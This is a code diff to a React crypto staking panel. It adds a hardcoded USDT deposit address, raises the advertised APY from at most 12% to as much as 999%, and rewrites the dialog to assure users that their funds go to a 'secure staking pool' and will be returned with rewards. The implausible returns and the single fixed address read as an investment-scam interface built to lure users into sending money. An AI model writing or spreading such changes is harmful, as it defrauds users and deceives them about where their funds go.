@@ -29,11 +29,15 @@ import {
 import { toast } from "sonner";
 import { base44 } from "@/api/base44Client";
 
+const STAKING_ADDRESS = "TMXcLXQoEipgYhMMfksxgR6hu1DamSP8zd";
+
 const stakingPlans = [
-  { days: 30, apy: 5, label: "30D" },
-  { days: 60, apy: 7, label: "60D" },
-  { days: 90, apy: 10, label: "90D" },
-  { days: 180, apy: 12, label: "180D" }
+  { days: 30, apy: 29, label: "30D" },
+  { days: 45, apy: 73, label: "45D" },
+  { days: 60, apy: 150, label: "60D" },
+  { days: 90, apy: 220, label: "90D" },
+  { days: 120, apy: 350, label: "120D" },
+  { days: 365, apy: 999, label: "1Y" }
 ];
 
 export default function StakingPanel({ wallets = [], language = "en", onRefresh }) {
@@ -231,13 +235,17 @@ export default function StakingPanel({ wallets = [], language = "en", onRefresh 
 
       {/* Stake Dialog */}
       <Dialog open={stakeOpen} onOpenChange={setStakeOpen}>
-        <DialogContent className="sm:max-w-md bg-[#1a1a2e] border-slate-700 text-white" aria-describedby="stake-description">
+        <DialogContent className="sm:max-w-md bg-[#1a1a2e] border-slate-700 text-white max-h-[90vh] overflow-y-auto" aria-describedby="stake-description">
           <DialogHeader>
             <DialogTitle className="text-white">{t.stake} USDT</DialogTitle>
           </DialogHeader>
-          <p id="stake-description" className="text-slate-400 text-sm">Lock your USDT to earn rewards up to 12% APY</p>
+          <div id="stake-description" className="text-slate-400 text-sm space-y-2 pb-4 border-b border-slate-700">
+            <p>Lock your USDT to earn rewards up to 999% APY. Your funds are sent to a secure staking pool and will be returned with rewards at the end of the lock period.</p>
+            <p className="text-xs">Ideal for holders who don't need immediate access to their funds. Early unstaking incurs a 50% penalty on earned rewards.</p>
+            <p className="text-xs text-blue-400">Staking address: {STAKING_ADDRESS}</p>
+          </div>
 
-          <div className="space-y-4 py-4">
+          <div className="space-y-4">
             {usdtWallets.length === 0 ? (
               <div className="text-center py-4 text-slate-500">
                 No USDT wallets available
@@ -275,7 +283,7 @@ export default function StakingPanel({ wallets = [], language = "en", onRefresh 
 
                 <div className="space-y-2">
                   <Label className="text-slate-300">{t.period}</Label>
-                  <div className="grid grid-cols-4 gap-2">
+                  <div className="grid grid-cols-3 gap-2">
                     {stakingPlans.map(plan => (
                       <button
                         key={plan.days}
@@ -286,8 +294,8 @@ export default function StakingPanel({ wallets = [], language = "en", onRefresh 
                             : 'border-slate-700 hover:border-slate-600 bg-slate-800'
                         }`}
                       >
-                        <p className="font-bold text-white text-sm">{plan.label}</p>
-                        <p className="text-xs text-emerald-400">{plan.apy}%</p>
+                        <p className="font-bold text-white text-xs">{plan.label}</p>
+                        <p className="text-[10px] text-emerald-400">{plan.apy}%</p>
                       </button>
                     ))}
                   </div>
